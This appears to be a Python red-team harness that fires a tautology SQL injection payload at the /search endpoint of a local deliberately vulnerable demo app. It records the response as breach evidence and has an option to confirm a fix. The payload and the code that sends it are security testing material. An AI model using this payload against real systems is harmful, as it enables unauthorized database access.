#!/usr/bin/env python3
"""
Red Team harness: SQL injection against SlopGuard demo-app.

Exit 0 = BREACHED (exploit succeeded — finding confirmed)
Exit 1 = SAFE / harness failed to confirm breach
Exit 2 = infrastructure error (app unreachable, bad args)

Sandbox only — never point at third-party targets.
"""

from __future__ import annotations

import argparse
import json
import sys
from pathlib import Path

from common import (
    default_artifacts_dir,
    http_get,
    utc_now,
    wait_for_health,
    write_evidence,
)

# Breaks out of LIKE '%{q}%' string-concat SQL in demo-app/app/db.py
SQLI_PAYLOAD = "' OR '1'='1' OR 'x"


def main() -> int:
    parser = argparse.ArgumentParser(description="SlopGuard SQLi Red Team harness")
    parser.add_argument(
        "--base-url",
        default="http://127.0.0.1:8000",
        help="demo-app base URL (sandbox)",
    )
    parser.add_argument(
        "--repo-root",
        type=Path,
        default=Path(__file__).resolve().parents[1],
    )
    parser.add_argument("--run-id", default=None)
    parser.add_argument(
        "--out",
        type=Path,
        default=None,
        help="Evidence JSON path (default: artifacts/<run_id>/sqli_http.json)",
    )
    parser.add_argument(
        "--expect-closed",
        action="store_true",
        help="Invert: exit 0 if exploit FAILS (used after fix / re-verify)",
    )
    args = parser.parse_args()

    base = args.base_url.rstrip("/")
    if not wait_for_health(base):
        print(f"demo-app not healthy at {base}", file=sys.stderr)
        return 2

    import urllib.parse

    url = f"{base}/search?q={urllib.parse.quote(SQLI_PAYLOAD)}"
    status, body, headers = http_get(url)
    try:
        data = json.loads(body)
        results = data.get("results") or []
    except json.JSONDecodeError:
        results = []
        data = {"raw": body}

    # Breach: injection returns more than a single targeted name match.
    breached = status == 200 and len(results) >= 3

    evidence = {
        "threat_id": "sql_injection",
        "harness": "sqli_http",
        "timestamp": utc_now(),
        "base_url": base,
        "request": {"method": "GET", "url": url, "payload": SQLI_PAYLOAD},
        "response": {
            "status": status,
            "headers": {k: headers.get(k) for k in ("content-type",)},
            "body": data,
            "result_count": len(results),
        },
        "breach_predicate": "status==200 and len(results)>=3",
        "breached": breached,
        "verdict": "BREACHED" if breached else "SAFE",
    }

    out = args.out
    if out is None:
        out = default_artifacts_dir(args.repo_root, args.run_id) / "sqli_http.json"
    write_evidence(out, evidence)
    print(json.dumps({"verdict": evidence["verdict"], "evidence": str(out)}, indent=2))

    if args.expect_closed:
        # Success means the path is closed (not breached).
        return 0 if not breached else 1
    return 0 if breached else 1


if __name__ == "__main__":
    raise SystemExit(main())
